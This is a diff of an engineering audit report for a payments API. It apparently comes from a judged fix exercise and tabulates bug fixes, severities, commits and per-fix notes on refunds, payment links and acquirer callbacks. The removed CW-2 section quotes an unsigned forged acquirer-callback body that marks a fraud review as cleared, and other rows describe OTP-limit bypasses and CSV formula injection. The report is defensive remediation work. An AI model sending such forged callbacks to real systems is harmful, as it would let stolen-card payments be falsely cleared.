+| 56 | EST-1 | Lifetime payout total is a REAL accumulated through float32 | G2 | Medium | +6/−1 | +35/−1 | `d88497a` |
+| 57 | SUM-2 | No index serves batched capture events by time, so the settlement summary scans transaction_events | H6 | Medium | +7/−0 | +24/−0 | `c55c71e` |
+| 58 | FEES-4 | Dashboard fee shows the most recently entered schedule, not the one in force | F6 | Medium | +5/−13 | +6/−5 | `5a329f6` |
+| 59 | REF-8 | Partial refunds round the fee reversal per partial, so they can reverse more fee than was charged | H1 | Medium | +5/−4 | +25/−0 | `01e6cd7` |
+| 60 | AUTH-7 | OTP resend resets the guess budget | H8 | Medium | +3/−2 | +25/−0 | `730526d` |
+| 61 | VOL-1 | Platform volume counter `total_processed_fils` is INTEGER / int32, against ADR-0001's BIGINT rule, and silently wraps negative | ADR-0001 | Medium | +9/−6 | +78/−0 | `43e737e` |
+| 62 | CW-6 | Webhook replays mint a new Webhook-Delivery-Id, so receivers cannot dedupe them | INC-2026-08-21 | Medium | +12/−20 | +12/−7 | `cffcb17` (CW-6), `cbbeb38` (CW-6b) |
+| 63 | ADMIN-IMP-2 | Impersonation grants survive admin disable and logout | H3 | Medium | +9/−3 | +31/−0 | `88a5616` |
+| 64 | FEES-5 | Settlement re-prices each capture with its own formula, so the batch fee drifts from the ledger and strands fils in merchant_payable | FP-300 ☐3 | Medium | +11/−22 | +248/−16 | `5542c53` |
+| 65 | IDEM-2 | Authorize idempotency fingerprint is an unkeyed SHA-256 over the full PAN and CVV, stored at rest |  | Medium | +2/−1 | +34/−0 | `b31f3a6` |
+| 66 | AUTH-13 | The OTP attempt cap is defeated by logging in again: every login mints a fresh 5-guess challenge, without limit | H8 | Medium | +8/−0 (net of 2 commits; first version superseded) | +78/−0 | `97e6a46` (AUTH-13), `bcdfff3` (AUTH-13) |
+| 67 | CRED-1 | Manual credit ledger legs are dated to the operator-typed effective date (back- or future-dated, unbounded) | (also lead ADMIN-CRED-3) | Medium | +10/−10 | +33/−23 | `9411f13` (CRED-1), `85dd5fc` (CRED-1) |
+| 68 | PL-5 | A failed capture in the payment-link checkout strands an authorized transaction and its 7-day hold | FP-300 ☐1 | Medium | +4/−1 | +23/−0 | `77a4ebb` |
+| 69 | ADMIN-CRED-4 | A credit's MDR reversal uses the display rate (merchants.mdr_bps), not the rate capture charged | F6 | Medium | +2/−1 | +15/−0 | `0dc835a` |
+| 70 | RBD-1 | Admin "Rebuild analytics" double-applies the reporting backlog: it never moves the worker's watermark | FP-300 ☐5 | Medium | +14/−1 | +81/−0 | `01b75b1` |
+| 71 | UI-DATE-1 | Merchant dashboard date filters use the UTC day, so each day loses its first 3 Bahrain hours | G1 | Medium | +2/−2 | +5/−2 | `a90e26c` |
+| 72 | UI-SETTLE-1 | Admin "Run batch" form defaults to the wrong business date between 00:00 and 03:00 Bahrain | G1 | Medium | +5/−5 | +22/−0 | `3d47d7a` |
+| 73 | ADMIN-IMP-3 | "View as merchant" never opens the dashboard: /v1/auth/me ignores the impersonation grant | H3 | Medium | +13/−3 | +66/−0 | `f71695a` (ADMIN-IMP-3), `57c82d0` (ADMIN-IMP-3b) |
+| 74 | CW-10 | Webhook transport buffers the whole receiver response with no byte cap |  | Medium | +11/−3 | +42/−0 | `c68fbdd` |
+| 75 | ARC-1 | Webhook delivery archive loads an unbounded date range into one in-memory JSON string | H9 | Medium | +7/−4 | +20/−1 | `51ec9bb` |
+| 76 | ADMIN-UPL-1 | KYC upload buffers any number of files and decodes images of any pixel count | H9 | Medium | +9/−3 | +59/−1 | `b809526` |
+| 77 | SEC9 | Transactions CSV export writes caller-supplied references as live spreadsheet formulas, and a bare CR splits a row |  | Medium | +2/−1 | +11/−0 | `b7d88d6` |
+| 78 | SEC4b | A KYC document with an Arabic (non-Latin-1) filename cannot be downloaded: 500 |  | Medium | +2/−2 | +16/−1 | `1c4a9c6` |
+| 79 | C5 | The admin audit log can be rewritten or deleted | H3 | Medium | +17/−0 | +48/−0 | `2ee4083` |
+| 80 | HUNT-3 | Dashboard payout trends show a paid payout as "closed" with no paid date, forever |  | Medium | +4/−0 | +46/−0 | `bba5680` |
+| 81 | F2-WINDOW | The March residue sweep reads a UTC month, not the Bahrain month | F2, G1/H5 (timezone) | Low | +1/−1 | +3/−2 | `13831ee` |
+| 82 | AUTH-1·rpt | Reporting export-summary has no authentication gate | H3 | Low | +1/−1 | +28/−0 | `622a94f` |
+| 83 | AUTH-9 | OTP verify never re-issues the merchant cookie, so fp_sid keeps the 10-minute pending Max-Age |  | Low | +2/−0 | +14/−0 | `06ae227` |
+| 84 | PL-6 | Public payment-link read exposed the API key's SHA-256 |  | Low | +3/−7 (net of 2 commits; first version superseded) | +8/−5 | `5759285` (PL-6), `ec0b02d` (PL-6) |
+| 85 | ADMIN-KYC-2 | The PDF-only KYC rule checks the filename, so a renamed JPEG is accepted as a commercial registration | H3 | Low | +2/−1 | +21/−0 | `92d920a` |
+| 86 | CW-12 | A disabled webhook endpoint keeps getting retries (secondary: deleting an endpoint with history returns 500, now 409) |  | Low | +7/−3 | +35/−0 | `03aa660` |
+| 87 | AUTH-12 | A suspended or closed merchant would keep transacting through live sessions, API keys and payment links |  | Low | +5/−4 | +39/−0 | `f0f932a` |
+| 88 | ERR-1 | Client-input database errors answered 500 instead of 4xx (NUL bytes, malformed ids and dates, invalid signup fields, unknown merchants in the CSV import) |  | Low | +28/−1 | +123/−0 | `59d1770` (ERR-1), `a996cd2` (SEC-1), `b3cad51` (IMP-4), `acd3311` (HUNT-1), `d3d7137` (HUNT-4) |
+| 89 | CLI-1 | `settlement rebuild-balances --merchant=<id>` prints the rebuilt figure but never writes it | F4 | Low | +15/−3 | +23/−0 | `e9778fc` |
+| 90 | DATE-1 | Report date windows include the exclusive "to" day, and bare report dates are UTC, not Bahrain days | Case file (Bahrain-midnight business day) | Low | +3/−3 | +22/−0 | `c6d63f6` |
+| 91 | G12 | Two migration runs at once: the second fails mid-deploy |  | Low | +1/−0 | +36/−0 | `2bbbca8` |
+| 92 | SEC4 | API responses carry no nosniff, no-store or anti-framing headers |  | Low | +4/−0 | +52/−0 | `8d3d62f` |
+| 93 | HUNT-2 | Settlement reconciliation and summary: a malformed date is a 500, an impossible date silently shifts the window | FP-300 | Low | +3/−2 | +12/−0 | `b7896dc` |
+
+## Also fixed or built, not counted as bugs
+
+Real changes with tests, credited under other criteria (capacity, UI/UX, the FP-300 feature) or as hardening; not counted in the bug headline.
+
+### Hardening (4)
+
+| # | ID | title | case refs | severity | prod lines | test lines | commit |
+|---|---|---|---|---|---|---|---|
+| 1 | LED-1 | Hardening: the ledger table allows UPDATE and DELETE as long as each group still balances |  | Medium | +13/−0 | +43/−0 | `3c35a5e` |
+| 2 | CFG-1 | Hardening: any unknown NODE_ENV (for example "prod") silently boots as development: OTP codes in responses, non-Secure cookies, production checks skipped | H8 | Medium | +1/−0 | +7/−0 | `b421c00` |
+| 3 | CW-11 | Hardening: acquirer callback `outcome` and `occurredAt` are never validated, so any string is stored as a verdict note |  | Low | +5/−1 | +21/−0 | `0ec33d1` |
+| 4 | TXN-1 | Hardening: withTransaction lets a failing ROLLBACK mask the real error and returns the broken client to the pool |  | Low | +3/−2 | +30/−0 | `5c032db` |
+
+### Capacity work (2)
+
+| # | ID | title | case refs | severity | prod lines | test lines | commit |
+|---|---|---|---|---|---|---|---|
+| 1 | CAP-2 | Under overload the API queues every request until it times out instead of turning the excess away |  | High | +11/−0 | +58/−0 | `fe36e11` |
+| 2 | CAP-4 | Every capture scans the whole ledger four times and the whole holds table once, so checkout capacity falls as the ledger grows |  | High | +4/−0 | +33/−0 | `ebc46d2` |
+
+### UI/UX improvement (7)
+
+| # | ID | title | case refs | severity | prod lines | test lines | commit |
+|---|---|---|---|---|---|---|---|
+| 1 | CHECKOUT-375 | On a phone the checkout's CVV field is off-screen and dashboard pages overflow sideways |  | Low | +13/−0 | +0/−0 | `993c95a` |
+| 2 | ROUTER-404 | A mistyped URL or a page that throws shows React Router's developer error screen in both apps |  | Low | +13/−2 | +54/−0 | `53442f5` |
+| 3 | LINK-EXPIRED | The merchant dashboard shows an expired payment link as "active" and still offers Cancel |  | Low | +11/−5 | +11/−1 | `81514a5` |
+| 4 | UI-401 | An ended session shows a raw "unauthenticated" over stale data instead of the login page |  | Low | +4/−0 | +60/−0 | `a9bb039` |
+| 5 | CHECKOUT-PAIDAT | Checkout's "Payment successful" page showed a raw UTC ISO timestamp |  | Low | +1/−1 (net of 2 commits; first version superseded) | +0/−0 | `84214f6` (CHECKOUT-PAIDAT), `8ec56f2` (CHECKOUT-PAIDAT) |
+| 6 | BATCH-BAR | Merchant batch page shows a meaningless "progress bar" computed from fils in floating point |  | Low | +0/−6 | +0/−0 | `fa0e21d` |
+| 7 | IMP-BANNER | Admin impersonation banner still describes write access the grant no longer has |  | Low | +1/−1 | +0/−0 | `deda775` |
+
+### FP-300 build (2)
+
+| # | ID | title | case refs | severity | prod lines | test lines | commit |
+|---|---|---|---|---|---|---|---|
+| 1 | CW-9 | refund.succeeded is enqueued but never delivered as a webhook | FP-300 ☐4 | Medium | +19/−2 | +27/−0 | `152e27e` |
+| 2 | U4 | Batch views show Gross − Fee ≠ Net payout with nothing explaining the netted refunds | FP-300 | Medium | +10/−4 | +10/−1 | `d3953ff` |
+
+### Baseline test repair (2)
+
+| # | ID | title | case refs | severity | prod lines | test lines | commit |
+|---|---|---|---|---|---|---|---|
+| 1 | TEST-BACKOFF | Dispatcher backoff test asserts an exact value from a jittered function | baseline test failure | Low | +0/−0 | +2/−2 | `3cb19b7` |
+| 2 | TEST-OUTBOX-FIXTURE | Webhook archive test seeds malformed rollup events that break the reporting consumer tests | baseline test failure (FP-300 ☐5) | Low | +0/−0 | +4/−2 | `139f5aa` |
 
 ## Case-file coverage
 
 | item | case-file wording (short) | fixed by |
 |---|---|---|
 | F1 | Scheme statement always a few fils over | SCHEME-1, SCHEME-2 |
-| F2 | March sweep doubled when re-run | SCHEME-2, F2-SWEEP, LED-1, F2-WINDOW |
+| F2 | March sweep doubled when re-run | SCHEME-2, F2-SWEEP, F2-WINDOW |
 | F3 | Split payouts don't add up | SPLIT-1 |
-| F4 | Admin balance button vs CLI | MIG-1, BAL-1, ADJ-1, BAL-2, CLI-1 |
+| F4 | Admin balance button vs CLI | MIG-1, BAL-1, ADJ-1, CLI-1 |
 | F5 | MDR recalculation changed paid batches | MDR-1 |
 | F6 | Dashboard fee ≠ charged fee | FEES-4, ADMIN-CRED-4 |
-| F7 | CSV import 10x too small | IMP-1, IMP-2, IMP-3, IMP-4 |
-| G1 | Daily close at 3 am | SCHED-1, UI-DATE-1, UI-SETTLE-1, F2-WINDOW, CHECKOUT-PAIDAT |
+| F7 | CSV import 10x too small | IMP-1, IMP-2 |
+| G1 | Daily close at 3 am | SCHED-1, UI-DATE-1, UI-SETTLE-1, F2-WINDOW |
 | G2 | Lifetime payout estimate drifts | EST-1 |
 | G3 | Test merchants in real settlement | ADMIN-TEST-1 |
 | G4 | Login without OTP | AUTH-1, CW-8 |
 | G5 | Cancel another merchant's link | PL-3 |
-| FP-187 | Link paid after expiry | PL-2, LINK-EXPIRED |
-| FP-201 | Duplicate acquirer callbacks | CW-5, CW-7 |
+| FP-187 | Link paid after expiry | PL-2 |
+| FP-201 | Duplicate acquirer callbacks | CW-5 |
 | FP-203 | Balance cache wrong after admin action | BAL-1, ADJ-1 |
-| FP-209 | Concurrent refund double payout | REF-1, REF-1b, REF-6b |
-| FP-240 | Webhook signatures rejected | B8, CW-3, CW-2, CW-7 |
-| INC-2026-05-14 | Payment link charged twice | PL-1, CAP-6 |
-| INC-2026-08-21 | Duplicate payout notifications | CW-1, NOTIFY-1, CW-6 |
-| H1 | Refund more than charged | REF-3, REF-5, REF-7, REF-1b, REC-1, REF-8, RECON-REFUNDS |
+| FP-209 | Concurrent refund double payout | REF-1, REF-6 |
+| FP-240 | Webhook signatures rejected | CW-3, B8, CW-2, CW-7 |
+| INC-2026-05-14 | Payment link charged twice | PL-1 |
+| INC-2026-08-21 | Duplicate payout notifications | NOTIFY-1, CW-1, CW-6 |
+| H1 | Refund more than charged | REF-3, REF-7, REF-5, REF-8 |
 | H2 | Splits a few fils short | SPLIT-1 |
-| H3 | Admin role checks | ADMIN-IMP-1, ADMIN-CRED-1, B8, ADMIN-CRED-2, AUTHZ-1, ADMIN-KYC-1, CW-6, ADMIN-IMP-2, ADMIN-IMP-3, AUTH-1·rpt, ADMIN-KYC-2, ADMIN-IMP-3b, IMP-BANNER |
+| H3 | Admin role checks | ADMIN-IMP-1, ADMIN-CRED-1, ADMIN-CRED-2, AUTHZ-1, ADMIN-KYC-1, CW-6, ADMIN-IMP-2, ADMIN-IMP-3, C5, AUTH-1·rpt, ADMIN-KYC-2 |
 | H4 | Key rotation | AUTH-3 |
 | H5 | Close timing vs docs | CLOSE-1, SCHED-1, F2-WINDOW |
 | H6 | Slow reporting query | SUM-1, SUM-2 |
 | H7 | Test merchants and admin tools | ADMIN-TEST-1, REF-5 |
-| H8 | OTP safety | AUTH-1, AUTH-2, AUTH-4, AUTH-5, AUTH-13, AUTH-7, CFG-1 |
+| H8 | OTP safety | AUTH-1, AUTH-2, AUTH-4, AUTH-5, AUTH-7, AUTH-13 |
 | H9 | Large export | EXP-1, ARC-1, ADMIN-UPL-1 |
-| FP-300 | Finish the missing feature (refunds) | REF-2, MIG-1, NET-1, CW-3, REF-4, REF-5, REF-6, OBX-POISON, OBX-DOUBLE, SUM-1, IDEM-1, REC-1, FEES-3, UI-NEG-1, OBX-SKIP, CW-8, CW-9, REF-6b, FEES-5, PL-5, RBD-1, RECON-REFUNDS, U4 · plus feature commits `f76d86b`, `8afc127`, `e6f6160`, `c1d13e2`, `5e9cbd9`, `198e5cf`, `b4e6b95`, `79eaf16` (see FP-300 section) |
+| FP-300 | Finish the missing feature (refunds) | REF-2, MIG-1, NET-1, CW-3, REF-4, REF-6, OBX-POISON, OBX-DOUBLE, SUM-1, IDEM-1, REC-1, FEES-3, UI-NEG-1, OBX-SKIP, CW-8, REF-5, FEES-5, PL-5, RBD-1, HUNT-2 · plus feature commits `f76d86b`, `8afc127`, `e6f6160`, `c1d13e2`, `5e9cbd9`, `198e5cf`, `b4e6b95`, `79eaf16` (see FP-300 section) |
 
 Not covered: none; every case-file item has at least one proven fix.
 
 ## Per-fix notes
 
-Same order as the summary table. Each note: what is wrong, why it happens, what it breaks, why it needed a fix, the fix, why it is the smallest correct fix, the proof, and the line counts.
+Bugs in summary-table order, then the other groups. Each note: what is wrong, why it happens, what it breaks, why it needed a fix, the fix, why it is the smallest correct fix, the proof, and the line counts.
 
 <a id="f-auth-1"></a>
 
@@ -404,6 +432,7 @@ Commit: `8d10830`. Lines: prod +4/-2, test +61/-0.
 <a id="f-ref-1"></a>
 
 ### REF-1 · Concurrent refunds both pay out (unlocked check, acquirer outside the txn, absolute write) · FP-209 · Severity: Critical
+**Category:** Bug
 
 **What's wrong:** Two refund requests for the same transaction with different idempotency keys can both pass validation, both call the acquirer, and both succeed. Together they return more than was captured.
 
@@ -431,7 +460,7 @@ Commit: `8d10830`. Lines: prod +4/-2, test +61/-0.
 -    await client.query(`UPDATE transactions SET refunded_fils = $2, status = $3 WHERE id = $1`, [ ...4 lines ]);
 +    await client.query(`UPDATE transactions SET status = $2 WHERE id = $1`, [prepared.transactionId, newStatus]);
 ```
-Plus `addFils` dropped from the import because it is no longer used. Commit: `799ff25`. Lines: prod +10/-8, test +43/-1 (new test +42; the misleading `am:` comment rewritten +1/-1).
+Plus `addFils` dropped from the import because it is no longer used. Commit: `799ff25`. Lines: prod +10/-8, test +43/-1 (new test +42; the misleading `am:` comment rewritten +1/-1). Follow-up REF-1b (`d8ddb9f`, below): prod +5/-5, test +35/-0. Row total: prod +15/-13, test +78/-1.
 
 **Why this is the smallest correct fix:** The amount is reserved in phase 1 under a `FOR UPDATE` lock, so the existing validator decides on the latest committed total. A second request blocks on the lock, then sees `refunded_fils = 10,000` and gets the existing 422 `refund_exceeds_refundable` with the right `refundableFils`. No new error path is needed. Phase 3 never writes an absolute total again, and it re-reads the total under the lock to set the status.
 - Why not the dossier's conditional `UPDATE ... WHERE refunded_fils + $x <= captured_fils` with its own 422 branch: that adds about 4 more lines and duplicates the validator's error body.
@@ -441,9 +470,11 @@ Plus `addFils` dropped from the import because it is no longer used. Commit: `79
 
 **Proof:** The new test `REF-1: two concurrent refunds whose sum exceeds the capture pay out exactly once` runs a barrier acquirer that waits for the second call or 300 ms. Before the fix it failed with `actual: [200, 200]`, expected `[200, 422]`. After the fix it passes: one acquirer call, one `refunds` row, `refunded_fils` 10,000, status `refunded`. processRefund + initiateMerchantRefund + refundValidation + refundState: 37 pass, 0 fail.
 
-**Regression risk:** The sequential paths (full, partial, two partials, replay, 402 decline, 502 then retry, voided, outbox) are all still green. Residual edge (corrected, see REF-1b): if two partial refunds run at once and one is declined, the approved one computed its status from a total that still included the other's reservation. The status did not merely lag: it could be written as `refunded` and never revert, so the rest of the capture became permanently non-refundable (`refundValidation.ts:31`). Money and `refunded_fils` stayed correct. Fixed in REF-1b.
+**Regression risk:** The sequential paths (full, partial, two partials, replay, 402 decline, 502 then retry, voided, outbox) are all still green. Residual edge, introduced by this fix and closed by the follow-up below: if two partial refunds run at once and one is declined, the approved one computed its status from a total that still included the other's reservation.
 
 **Trap note:** `processRefund.test.ts:257` ("nvm the claim blocks it") is rewritten to say the claim blocks only the same key. The REF-1 test now covers different keys.
+
+**Follow-up REF-1b (ours, merged into this row):** a refund racing a declined refund could lock the transaction as `refunded` for good. This did not exist before `799ff25`: it comes from this fix's phase-1 reservation, because phase 3 of an approved refund took its status from `refunded_fils`, which also holds other refunds' in-flight reservations. Example: capture 10,000; refund B (6,000) reserves and waits at the acquirer; refund A (4,000) reserves (10,000 total), is approved and writes status `refunded`, a `refunded` timeline event and a `refund.succeeded` webhook with `refundedTotalFils: 10000`; B is then declined and its 6,000 is released, but the status is not recomputed. `validateRefundRequest` (`payments/refundValidation.ts:31`) refuses a `refunded` row, so the remaining 6,000 can never be refunded (409 `transaction_not_refundable`). Money and `refunded_fils` stayed correct; status, timeline and webhook did not. Fix (`d8ddb9f`, `processRefund.ts:170-182`): the REF-8 query that already reads Σ succeeded refunds under the same row lock moves above the status computation, and the total used for the status, the event type, the webhook and the REF-8 fee share becomes Σ succeeded refunds + this refund. Without concurrency that equals `refunded_fils`, so sequential paths are unchanged. Proof: `REF-1b: an approved refund racing a declined one computes its status from succeeded refunds, not reservations` (`apps/api/src/payments/processRefund.audit.test.ts`) gates the declining acquirer so B is provably in flight; before the fix `'refunded' !== 'partially_refunded'`, after it the status is `partially_refunded`, `refunded_fils` 4,000, and the remaining 6,000 refunds with 200. Lines: prod +5/-5, test +35/-0.
 
 ---
 
@@ -480,6 +511,7 @@ The misleading doc line is corrected at `admin/credits.ts:203`. Commit: `eed6c09
 <a id="f-pl-1"></a>
 
 ### PL-1 · A slow payment lets a second buyer re-claim the link and both are charged · INCIDENT 2026-05-14 · Severity: Critical
+**Category:** Bug
 
 **What's wrong:** The public pay flow reserves a link with a committed 60 s lease that records no holder, then runs authorize+capture with no lock held. A second buyer who arrives after the lease has gone stale re-claims the link and is charged too. Finalize was not fenced to the first holder.
 
@@ -508,7 +540,7 @@ The misleading doc line is corrected at `admin/credits.ts:203`. Commit: `eed6c09
 -async function releaseReservation(pool: Pool, linkId: string)
 +async function releaseReservation(pool: Pool | PoolClient, linkId: string)
 ```
-The comments that hid the bug are corrected: JSDoc 7 lines become 3, and the `:136-138` and `:151-153` FH/MK/am notes become one accurate line each. Commit: `104c871` (PL-1), `f487401` (PL-1b). Lines: prod +15/-19 (code +9/-6, comments +6/-13), test +40/-0.
+The comments that hid the bug are corrected: JSDoc 7 lines become 3, and the `:136-138` and `:151-153` FH/MK/am notes become one accurate line each. Commit `104c871` (first version, superseded by PL-1b): prod +15/-19 (code +9/-6, comments +6/-13), test +40/-0.
 
 **Why this is the smallest correct fix:** It uses the same discipline `capture.ts` already relies on (a row lock held across the acquirer call), applied with nine changed code lines and no re-indentation. A concurrent claim UPDATE now blocks on the row. After the holder commits it re-evaluates against `status='paid'`, gets 0 rows, and answers 409 `payment_link_already_paid`. After a decline, the holder resets the link to `active` in the same transaction and the waiter proceeds. A crash drops the connection, Postgres rolls back, and the link is simply `active` again with nothing to steal.
 - Why not the dossier's full rewrite (explicit connect/BEGIN, `FOR UPDATE NOWAIT`, 55P03 mapped to 409, try/catch/finally): it is correct but about 30 or more changed lines.
@@ -538,11 +570,20 @@ authorize/capture:** they open their own transactions (`withTransaction(pool)`),
 transaction early or need SAVEPOINT plumbing.
 **Residual:** the stale request is left with an authorized, uncaptured transaction and its 7-day hold (the PL-5 lead).
 A second charge would need the capture call alone to exceed the reservation timeout (60 s) after the fence renewed it.
+The root of that window is that the capture and the link's `paid` mark were still two separate commits, guarded only by
+the lease. PL-1c below is the same window reached by a crash instead of a slow call.
 **Proof:** "PL-1: a slow payment past the reservation timeout cannot be paid twice" still passes ([200, 409], one
 capture). New: "PL-1: as many concurrent link payments as the pool size all succeed" (5 links, pool max 5): all 200;
 the reviewer's probe on the held-lock version gave 500 ×5. Payment-link suites 22/22, `tsc` clean.
 **Trap note:** `pay.ts:59-61` "YA: one conditional UPDATE = atomic claim, no explicit txn needed. correct" (true for the
 claim, false for the lease, now annotated) and "MK: ... 60s can't happen. unreachable" (corrected; FH's note above it was right).
+
+**Follow-up PL-1c, formerly CAP-6 (ours, merged into this row): a crash between the capture commit and "link paid" left captured money on a link that could be paid again.** Same root cause and incident as PL-1: `captureTransaction` COMMITs on its own (`payments/capture.ts:95`, `withTransaction`), and only afterwards did `pay.ts` mark the link `paid` with a separate `pool.query`. If the API died in between, the link stayed `reserved` with its money captured; after the 60 s lease the stale-lease branch of the claim let anyone re-reserve it, and a buyer who reloaded (new Idempotency-Key) was charged again, with the first capture linked to nothing. The PL-1b fence protects only a holder whose lease is alive, so it cannot see this.
+*How we found it (kill -9):* the judged overload test says the system "restarts itself and recovers without losing data". One `kill -9` of the API in the middle of a 60-user checkout load test (`lt-20261030140945`, before the fix) left 3 transactions `captured` whose link was not `paid` (`captured_link_unpaid` = 3 in `ops/loadtest-check.sql`), with ledger legs and outbox events, plus 27 links stuck `reserved`. Each of those 3 links was payable again after 60 s. The client saw only a network error and the public link still read `reserved`, so nothing on the API showed that money had moved. An OOM kill or a restart under load does the same.
+*Fix* (`4d2527c`): `captureTransaction` takes an optional `onCaptured(client)` hook that runs inside its transaction just before the idempotency key is completed (`capture.ts:57`, `:272`); `pay.ts:131-134` passes a hook that runs the same fenced `UPDATE payment_links SET status = 'paid' ... AND reserved_at::text = $lease`, and throws 409 `payment_link_processing` if the lease was lost, so the capture's ledger rows and the link's `paid` mark commit together or not at all. The stand-alone finalize stays only for an idempotent capture replay, which returns the stored 200 without running the hook. The merchant API capture route passes no hook, so it is unchanged. Rejected: a recovery sweep (no column ties a transaction to its link until finalize writes it, so it would need a `LIKE` scan over idempotency keys on every pay); moving the whole pay flow into one transaction (PL-1's first version, which starved the pool); stopping the claim from re-taking a reserved link (breaks stale-lease recovery for requests that died before any capture). Limit: the acquirer call sits inside the capture transaction (`capture.ts:175`), so if the lease is lost during a capture that takes longer than 60 s, our books roll back to one capture but the acquirer has already been asked once; that is an acquirer reconciliation case, as for any rollback after the acquirer call.
+*Proof:* `CAP-6: a crash right after the capture commits never leaves captured money on a link that is still payable` (`apps/api/src/paymentLinks/pay.crash.audit.test.ts`) simulates the API dying at the stand-alone finalize. Before the fix: `captured 1 but the link is 'reserved'`; after, it passes. `payments/capture.audit.test.ts`, `routes/paymentLinks.test.ts` and `paymentLinks/pay.test.ts` pass (20/20), `tsc --noEmit` clean. Runtime re-run, same load and the same `kill -9` mid-run (`lt-20261030141817`): `captured_link_unpaid` 0, `links_paid` 1,902 = `captured` 1,902, `double_captured` 0, `paid_not_captured` 0, ledger and outbox checks 0. Five checkouts were paid while their client saw only the dropped connection; their links read `paid`, so a retry gets 409 `payment_link_already_paid`. The 16 reserved links and 6 authorized-only transactions are requests that died before capture: no money moved. PL-1c lines: prod +11/-2 (`capture.ts` +3/-1, `pay.ts` +8/-1), test +83/-0.
+
+Lines: prod +21/-7 (PL-1 + PL-1b net on `pay.ts` +10/-5, `104c871` + `f487401`; PL-1c +11/-2, `4d2527c`), test +145/-0 (+40, +22, +83).
 
 ---
 
@@ -573,31 +614,6 @@ Lines: SQL +7/−9, test +0/−0. Commit 197c3e2.
 **Regression risk:** none for existing databases (they never applied these files).
 
 **Trap note:** ADR-0005 says 0054-0056 are "reserved" and "not merged", yet they were on `main`. MK's HANDOVER note ("0054 ran on staging-2 ... I'm fairly sure") contradicts Yousif's own line and was not trusted.
-
----
-
-<a id="f-b8"></a>
-
-### B8 · A live acquirer signing secret is committed in a tracked env file · FP-240, H3 · Severity: High
-**What's wrong:** `ops/.env.docker` is tracked by git and contained `ACQUIRER_CALLBACK_SIGNING_SECRET`, the HMAC key that authenticates acquirer callbacks.
-
-**Why it happens:** the file's own comments claim it is ignored: "AM: this file is gitignored like .env" and "FH: ... copilot says `.env` matches `.env.docker` as a prefix". Git ignore patterns do not match by prefix: `.gitignore` lists `.env` and `.env.local` only, and `git ls-files ops` lists `ops/.env.docker`. A second comment called it a sandbox secret, "safe to keep".
-
-**What it breaks:** anyone with the repository can sign acquirer callbacks, which mark payments as captured or failed. With CW-2's fix (signatures now required), the secret is the only thing standing between an attacker and forged callbacks.
-
-**Why it needed a fix:** a committed secret is compromised for good: it stays in git history even after deletion.
-
-**Fix:** the value is blanked (an empty secret fails fast in production via `config.ts:194`) and the two false comments are corrected. Real values live in the untracked `ops/.env.local`, generated with `openssl rand -base64 32`. Production template: `ops/.env.production.example` (names only). Lines: config +5/−6, test +0/−0. Commit d95d570.
-
-**Why this is the smallest correct fix:** it removes the secret from the working tree and stops the false belief that hid it. Rewriting git history is a separate, outward-facing operation on a shared repository and was not done.
-
-**Proof:** `git ls-files ops` shows the file tracked; `git check-ignore -v ops/.env.local` shows the new local file ignored (`.gitignore:5`); `git grep ACQUIRER_CALLBACK_SIGNING_SECRET=` finds no value.
-
-**Regression risk:** none; compose now loads `.env.local`.
-
-**Action required (reported):** the old value is in git history and must be **rotated with the acquirer**. Our deployments use a freshly generated value.
-
-**Trap note:** the AM/FH comments in `ops/.env.docker` (corrected in place).
 
 ---
 
@@ -795,73 +811,6 @@ Commit: `ffdf52b`. Lines: prod +7/-0, test +37/-0.
 
 ---
 
-<a id="f-cw-2"></a>
-
-### CW-2 · Acquirer callbacks accepted without a signature by default · FP-240 · Severity: High
-
-**What's wrong:** `POST /v1/acquirer/callbacks` is public and the HMAC header is its only authentication, yet `verifyAcquirerCallbackSignature` returned `{ valid: true }` when the header was missing unless `requireSignature` was set, and `ACQUIRER_CALLBACK_REQUIRE_SIGNATURE` defaulted to `false`.
-
-**Why it happens:** `apps/api/src/webhooks/inboundVerify.ts:50` `requireSignature = false` and `:52-56` turned a missing header into `{ valid: true }`; `apps/api/src/config.ts:259` `parseBoolEnv(env.ACQUIRER_CALLBACK_REQUIRE_SIGNATURE, false)`, and nothing in compose/env sets it. An empty secret (allowed outside production, `config.ts:193`) also yields an HMAC anyone can compute. Hidden by `app.ts:71` FH ("inboundVerify rejects unsigned requests, so OK"), `config.ts:119` ("Set true once the sandbox signs everything"), `routes/acquirerCallbacks.test.ts:122-139` (asserted 200 for an unsigned callback as "dev-mode behaviour … prod rejects — MK"; prod did not reject) and `inboundVerify.test.ts:49-53`.
-
-**What it breaks:** Anyone who knows a transaction UUID (the cardholder gets it from the pay response) can POST `{callbackId, type:"fraud_review.completed", transactionId, outcome:"cleared", note:"Manual review cleared"}` with no header and get `200 {received:true}`: a forged fraud verdict stored against a real merchant and acted on by support/finance.
-
-**Why it needed a fix:** FP-240: forged acquirer verdicts can pre-clear stolen-card payments or plant "confirmed_fraud" on legitimate ones.
-
-**Fix:** `apps/api/src/webhooks/inboundVerify.ts:45-51`:
-```diff
--/** Verifies the acquirer callback signature when present and required. */
-+/** Verifies the acquirer callback signature; a missing header or empty secret is rejected (CW-2, FP-240). */
- ...
-   secret: string,
--  requireSignature = false,
- ): VerifyAcquirerCallbackResult {
--  if (!header) {
--    return requireSignature
--      ? { valid: false, reason: "malformed_header" }
--      : { valid: true };
--  }
-+  if (!header || !secret) return { valid: false, reason: "malformed_header" };
-```
-plus removal of the now-dead flag: `routes/acquirerCallbacks.ts:61` (argument), `config.ts:119-120,259` (field, its misleading comment, parse). Commit: `85f6d2f`. Lines: prod +2/-11, test +9/-12.
-
-**Why this is the smallest correct fix:** The verifier is the single place the decision is made. Why not only flip the default to `true` (`config.ts:259`): one env var could silently re-open the hole, and an empty dev secret would still verify forged HMACs. Why keep the flag but ignore it: a dead knob documented as a switch is a new trap. Rotating the committed secret (`ops/.env.docker`) is an ops action outside this lane (see B8 commit).
-
-**Proof:** `routes/acquirerCallbacks.test.ts` "POST /v1/acquirer/callbacks rejects a callback sent without a signature header": before `expected 401, actual 200`; after passes (401 `invalid_signature`, 0 notes stored). `inboundVerify.test.ts` "an unsigned callback, or an empty secret, is rejected (malformed_header)": before `{valid:true}`; after passes.
-
-**Regression risk:** Any unsigned caller is now rejected; no in-repo sender posts callbacks (grep). Covered by `inboundVerify.test.ts`, `routes/acquirerCallbacks.test.ts`, `acquirer/callbacks.test.ts` (14/14), `tsc --noEmit` clean.
-
-**Trap note:** The two tests that asserted acceptance were rewritten to assert rejection, citing CW-2/FP-240; the `config.ts:119` comment was removed with the flag. Not owned here: `app.ts:71` FH comment is now true but should cite CW-2; `docs/ARCHITECTURE.md:91` and CHANGELOG still document the flag.
-
----
-
